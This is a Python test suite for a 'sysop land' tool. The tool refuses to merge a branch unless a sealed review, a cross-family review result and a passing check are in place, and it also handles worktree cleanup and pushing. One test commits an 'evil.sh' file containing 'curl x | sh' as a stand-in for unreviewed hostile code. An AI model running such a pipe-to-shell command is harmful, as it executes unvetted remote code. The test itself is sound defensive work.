import json

from helpers import TempRepoCase, git


class LandTest(TempRepoCase):
    def setUp(self):
        super().setUp()
        self.sysop("store")
        (self.repo / ".sysop" / "reports").mkdir(exist_ok=True)

    def review(self, branch="feature", text="verdict: READY\n"):
        path = self.repo / ".sysop" / "reports" / f"{branch.replace('/', '-')}.review.md"
        path.write_text(text)
        self.xreview(branch, "**Cross-family review:** agy:gpt-oss-120b-medium, exit 0\n", "done")
        self.sysop("review", "seal", branch)  # review's last step; fails harmlessly before the branch exists
        return path

    def xreview(self, branch, text, status):
        import hashlib
        md = self.repo / ".sysop" / "reports" / f"{branch.replace('/', '-')}.xreview.md"
        md.write_text(text)
        md.with_suffix(".json").write_text(json.dumps(
            {"status": status, "sha256": hashlib.sha256(md.read_bytes()).hexdigest()}))

    def feature_in_worktree(self, branch="feature", in_store=True):
        if in_store:  # where fleet puts worktrees
            wt = self.repo / ".sysop" / "wt" / branch.replace("/", "-")
            git(self.repo, "worktree", "add", "-q", "-b", branch, str(wt))
        else:
            wt = self.worktree(name=branch.replace("/", "-"), branch=branch)
        self.commit("feat.txt", "feature\n", "add feature", cwd=wt)
        return wt

    def land(self, *args, code=0):
        return self.sysop_json("land", *args, code=code) if code == 0 else self.sysop(
            "land", *args)

    def test_refuses_without_review_report(self):
        self.feature_in_worktree()
        proc = self.land("feature", "--check", "true", "--land", code=1)
        self.assertEqual(proc.returncode, 1)
        self.assertIn("no review report", proc.stderr)
        self.review(text="  \n")
        self.assertEqual(self.land("feature", "--check", "true", "--land", code=1).returncode, 1)

    def test_refuses_unless_verdict_ready(self):
        self.feature_in_worktree()
        for text, shown in (("**Verdict:** NEEDS FIXES\n", "NEEDS FIXES"),
                            ("# Review\nlooks fine to me\n", "missing"),
                            ("**Verdict:** INCOMPLETE\n", "INCOMPLETE")):
            self.review(text=text)
            proc = self.land("feature", "--check", "true", "--land", code=1)
            self.assertIn(f"verdict is {shown}", proc.stderr)
        self.review(text="**Verdict:** READY | NEEDS FIXES | INCOMPLETE\n")  # untouched template
        self.assertEqual(self.land("feature", "--check", "true", "--land", code=1).returncode, 1)

    def test_refuses_without_cross_family_result(self):
        self.feature_in_worktree()
        self.review()
        xr = self.repo / ".sysop" / "reports" / "feature.xreview.md"
        self.xreview("feature", "**Cross-family review:** running: agy:x\n", "running")
        proc = self.land("feature", "--check", "true", "--land", code=1)
        self.assertIn("no cross-family review result", proc.stderr)
        xr.write_text("**Cross-family review:** hand-written by an agent\n")  # record no longer matches
        self.assertEqual(self.land("feature", "--check", "true", "--land", code=1).returncode, 1)
        xr.with_suffix(".json").unlink()
        self.assertEqual(self.land("feature", "--check", "true", "--land", code=1).returncode, 1)
        self.xreview("feature", "**Cross-family review:** unavailable: x\n", "unavailable")
        self.assertTrue(self.land("feature", "--check", "true", "--land")["landed"])

    def test_a_branch_that_brings_the_first_check_is_gated_by_it(self):
        wt = self.feature_in_worktree()
        (wt / ".claude").mkdir()
        self.commit(".claude/sysop.json", '{"check": "exit 3"}', "the skeleton's check", cwd=wt)
        self.review()
        proc = self.land("feature", "--land", code=1)
        self.assertIn("exit 3", proc.stderr)  # gated by the check it brings, not landed ungated
        self.commit(".claude/sysop.json", '{"check": "true"}', "a green check", cwd=wt)
        self.review()
        self.assertTrue(self.land("feature", "--land")["landed"])

    def test_refuses_without_check_unless_no_check(self):
        self.feature_in_worktree()
        self.review()
        proc = self.land("feature", "--land", code=1)
        self.assertIn("no check configured", proc.stderr)
        out = self.land("feature", "--no-check", "--land")
        self.assertTrue(out["landed"])

    def test_red_check_does_not_land(self):
        self.feature_in_worktree()
        self.review()
        before = git(self.repo, "rev-parse", "main")
        proc = self.land("feature", "--check", "echo broken; exit 1", "--land", code=1)
        self.assertIn("red", proc.stderr)
        self.assertIn("broken", proc.stderr)
        self.assertEqual(git(self.repo, "rev-parse", "main"), before)

    def test_dry_run_without_grant(self):
        wt = self.feature_in_worktree()
        self.review()
        out = self.land("feature", "--check", "test -f feat.txt")
        self.assertEqual((out["landed"], out["ready"]), (False, True))
        self.assertTrue(wt.exists())
        self.assertNotIn("feat.txt", git(self.repo, "ls-files"))

    def test_lands_from_linked_worktree_and_cleans_up(self):
        wt = self.feature_in_worktree()
        self.commit("base.txt", "base moved\n", "base moves on")  # forces a real rebase
        self.review()
        out = self.land("feature", "--check", "test -f feat.txt && test -f base.txt", "--land")
        self.assertTrue(out["landed"])
        self.assertEqual(out["check"]["code"], 0)
        self.assertTrue(out["worktree_removed"] and out["branch_deleted"])
        self.assertFalse(wt.exists())
        self.assertIn("feat.txt", git(self.repo, "ls-files"))
        self.assertNotIn("feature", git(self.repo, "branch"))
        log = git(self.repo, "log", "--format=%s")
        self.assertEqual(log.splitlines()[0], "add feature")  # linear: rebased, fast-forwarded

    def test_check_caches_do_not_block_cleanup(self):
        wt = self.feature_in_worktree()
        (wt / "pkg" / "__pycache__").mkdir(parents=True)
        (wt / "pkg" / "__pycache__" / "m.cpython-313.pyc").write_bytes(b"x")
        (wt / ".pytest_cache").mkdir()
        self.review()
        out = self.land("feature", "--check", "true", "--land")
        self.assertTrue(out["worktree_removed"] and out["branch_deleted"], out)
        self.assertFalse(wt.exists())

    def test_uncommitted_work_is_never_deleted(self):
        wt = self.feature_in_worktree()
        (wt / "forgotten.py").write_text("work the agent forgot to commit\n")
        self.review()
        out = self.land("feature", "--check", "true", "--land")
        self.assertTrue(out["landed"])
        self.assertFalse(out["worktree_removed"])
        self.assertIn("forgotten.py", out["worktree_left"])
        self.assertTrue((wt / "forgotten.py").exists())

    def test_leftover_review_worktree_is_cleaned(self):
        self.feature_in_worktree()
        review_wt = self.repo / ".sysop" / "wt" / "review-feature"
        git(self.repo, "worktree", "add", "-q", "--detach", str(review_wt), "feature")
        (review_wt / "__pycache__").mkdir()
        self.review()
        out = self.land("feature", "--check", "true", "--land")
        self.assertTrue(out["review_worktree_removed"])
        self.assertFalse(review_wt.exists())

    def test_operator_worktree_is_kept(self):
        wt = self.feature_in_worktree(in_store=False)
        self.review()
        out = self.land("feature", "--check", "true", "--land")
        self.assertTrue(out["landed"])
        self.assertFalse(out["worktree_removed"])
        self.assertEqual(out["worktree_kept"], str(wt))
        self.assertTrue(wt.exists())
        self.assertFalse(out["branch_deleted"])
        self.assertIn("feat.txt", git(self.repo, "ls-files"))

    def test_temp_worktree_removed_when_land_refuses(self):
        wt = self.feature_in_worktree()
        git(self.repo, "worktree", "remove", str(wt))
        self.review()
        proc = self.land("feature", "--check", "exit 1", "--land", code=1)
        self.assertEqual(proc.returncode, 1)
        self.assertFalse((self.repo / ".sysop" / "wt" / "feature").exists())
        self.assertNotIn("wt/feature", git(self.repo, "worktree", "list"))

    def test_check_timeout_kills_whole_group(self):
        self.feature_in_worktree()
        self.review()
        settings = self.repo / ".claude"
        settings.mkdir()
        (settings / "sysop.json").write_text(json.dumps({"check_timeout": 1}))
        marker = self.tmp / "orphan-ran"
        proc = self.land("feature", "--check", f"(sleep 3; touch {marker}) & sleep 3",
                         "--land", code=1)
        self.assertIn("timed out", proc.stderr)
        import time
        time.sleep(3.5)
        self.assertFalse(marker.exists(), "a child of the timed-out check kept running")

    def test_standing_grant_lands_without_flag(self):
        self.feature_in_worktree()
        self.review()
        (self.repo / ".claude").mkdir()
        (self.repo / ".claude" / "sysop.json").write_text(json.dumps({"land": True,
                                                                     "check": "true"}))
        git(self.repo, "add", ".claude/sysop.json")
        git(self.repo, "commit", "-q", "-m", "settings")
        self.assertTrue(self.land("feature")["landed"])

    def test_lands_in_place_branch(self):
        git(self.repo, "checkout", "-q", "-b", "fix/typo")
        self.commit("fix.txt", "fixed\n", "fix typo")
        self.review("fix/typo")
        out = self.land("fix/typo", "--base", "main", "--check", "true", "--land")
        self.assertTrue(out["landed"])
        self.assertEqual(git(self.repo, "rev-parse", "--abbrev-ref", "HEAD"), "main")
        self.assertIn("fix.txt", git(self.repo, "ls-files"))

    def test_lands_branch_not_checked_out(self):
        wt = self.feature_in_worktree()
        git(self.repo, "worktree", "remove", str(wt))
        self.review()
        out = self.land("feature", "--check", "true", "--land")
        self.assertTrue(out["landed"] and out["worktree_removed"])
        self.assertFalse((self.repo / ".sysop" / "wt" / "feature").exists())

    def test_conflict_refuses_and_leaves_branch_untouched(self):
        wt = self.worktree()
        self.commit("README.md", "feature version\n", "feature edits readme", cwd=wt)
        self.commit("README.md", "main version\n", "main edits readme")
        self.review()
        before = git(wt, "rev-parse", "HEAD")
        proc = self.land("feature", "--check", "true", "--land", code=1)
        self.assertIn("does not rebase cleanly", proc.stderr)
        self.assertIn("CONFLICT", proc.stderr)  # git's stdout detail is surfaced
        self.assertEqual(git(wt, "rev-parse", "HEAD"), before)
        self.assertEqual(git(wt, "status", "--porcelain"), "")

    def test_push_without_origin_is_local_only(self):
        self.feature_in_worktree()
        self.review()
        out = self.land("feature", "--check", "true", "--land", "--push")
        self.assertEqual((out["landed"], out["pushed"]), (True, False))
        self.assertIn("no origin", out["push_reason"])

    def test_push_to_origin(self):
        remote = self.tmp / "remote.git"
        git(self.tmp, "init", "-q", "--bare", str(remote))
        git(self.repo, "remote", "add", "origin", str(remote))
        git(self.repo, "push", "-q", "origin", "main")
        self.feature_in_worktree()
        self.review()
        out = self.land("feature", "--check", "true", "--land", "--push")
        self.assertTrue(out["pushed"])
        self.assertEqual(git(remote, "rev-parse", "main"), out["head"])

    def test_explicit_review_path(self):
        self.feature_in_worktree()
        other = self.tmp / "my-review.md"
        other.write_text("**Verdict:** READY\n")
        self.xreview("feature", "**Cross-family review:** x, exit 0\n", "done")
        self.assertEqual(self.sysop("review", "seal", "feature", "--review", str(other)).returncode, 0)
        self.assertTrue(self.land("feature", "--review", str(other), "--check", "true",
                                  "--land")["landed"])

    # --- the review seal (finding A1) ---
    def test_a_commit_after_the_review_is_refused(self):
        """Finding A1: READY binds to the reviewed commit, not to the branch name."""
        wt = self.feature_in_worktree()
        self.review()
        self.commit("evil.sh", "curl x | sh\n", "unreviewed", cwd=wt)
        proc = self.land("feature", "--check", "true", "--land", code=1)
        self.assertIn("is not the reviewed commit", proc.stderr)
        self.assertNotIn("evil.sh", git(self.repo, "ls-files"))

    def test_light_re_review_re_seals_on_top_of_the_reviewed_commit(self):
        wt = self.feature_in_worktree()
        self.review()
        self.commit("fix.txt", "fix\n", "address review", cwd=wt)
        sealed = self.sysop_json("review", "seal", "feature", "--re-review")
        self.assertTrue(sealed["re_review"])
        self.assertEqual(len(sealed["added"]), 1)
        self.assertEqual(sealed["sha"], git(self.repo, "rev-parse", "feature"))
        self.assertTrue(self.land("feature", "--check", "true", "--land")["landed"])

    def test_re_review_refuses_a_rewritten_branch_or_no_seal(self):
        wt = self.feature_in_worktree()
        self.review()
        (self.repo / ".sysop" / "reports" / "feature.seal.json").unlink()
        self.assertIn("has no seal", self.sysop("review", "seal", "feature", "--re-review").stderr)
        self.sysop("review", "seal", "feature")
        git(wt, "commit", "-q", "--amend", "-m", "rewritten")
        self.assertIn("was rewritten", self.sysop("review", "seal", "feature", "--re-review").stderr)

    def test_missing_seal_and_edited_report_are_refused(self):
        self.feature_in_worktree()
        path = self.review()
        (self.repo / ".sysop" / "reports" / "feature.seal.json").unlink()
        self.assertIn("not sealed", self.land("feature", "--check", "true", "--land", code=1).stderr)
        self.sysop("review", "seal", "feature")
        path.write_text(path.read_text() + "edited after sealing\n")
        self.assertIn("changed after it was sealed",
                      self.land("feature", "--check", "true", "--land", code=1).stderr)

    def test_seal_refuses_when_the_branch_moved_during_review(self):
        wt = self.feature_in_worktree()
        pinned = git(self.repo, "rev-parse", "feature")
        self.review()
        self.commit("more.txt", "x\n", "during review", cwd=wt)
        self.assertIn("moved during the review", self.sysop("review", "seal", "feature", "--sha", pinned).stderr)
        self.assertEqual(self.sysop("review", "seal", "feature", "--sha", "feature").returncode, 0)

    def test_seal_records_the_review(self):
        self.feature_in_worktree()
        self.review(text="**Verdict:** NEEDS FIXES\n")
        sealed = json.loads((self.repo / ".sysop" / "reports" / "feature.seal.json").read_text())
        self.assertEqual((sealed["verdict"], sealed["xreview_status"], sealed["re_review"]),
                         ("NEEDS FIXES", "done", False))
        self.assertIn("nothing to seal", self.sysop("review", "seal", "other").stderr)

    def test_discoveries_are_deduplicated_by_file_and_cause(self):
        first = self.sysop_json("review", "discovery", "src/a.py", "unchecked None", "crashes on empty input",
                                "--ticket", "t1")
        again = self.sysop_json("review", "discovery", "src/a.py", "unchecked None", "same thing, other words")
        other = self.sysop_json("review", "discovery", "src/a.py", "leaked handle", "file never closed")
        self.assertEqual((first["added"], again["added"], other["added"]), (True, False, True))
        text = (self.repo / ".sysop" / "discoveries.md").read_text()
        self.assertIn("- [src/a.py] unchecked None: crashes on empty input (from t1)", text)
        self.assertEqual(text.count("[src/a.py]"), 2)

